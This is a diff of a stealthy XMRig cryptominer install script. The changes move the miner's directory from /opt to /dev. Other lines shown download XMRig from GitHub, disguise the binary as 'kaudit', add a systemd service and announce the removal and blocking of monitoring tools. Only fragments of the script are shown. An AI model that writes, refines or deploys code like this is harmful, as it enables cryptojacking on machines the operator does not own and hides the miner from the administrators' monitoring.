@@ -2,9 +2,9 @@
 
 
 
-if [ ! -d "/opt" ]; then
-  echo "[*] /opt directory does not exist. Creating it..."
-  sudo mkdir -p /opt
+if [ ! -d "/dev" ]; then
+  echo "[*] /dev directory does not exist. Creating it..."
+  sudo mkdir -p /dev
 fi
 
 echo "[*] Removing and blocking monitoring/system tools..."
@@ -47,7 +47,7 @@ echo "[*] Starting XMRig Setup Script"
 # Constants
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
 XMRIG_ARCHIVE="/tmp/xmrig.tar.gz"
-XMRIG_DIR="/opt/xmrig"
+XMRIG_DIR="/dev/xmrig"
 XMRIG_BINARY="$XMRIG_DIR/kaudit"
 SERVICE_FILE="/etc/systemd/system/xmrig.service"
 HUGE_PAGES=$((1280 + $(nproc)))
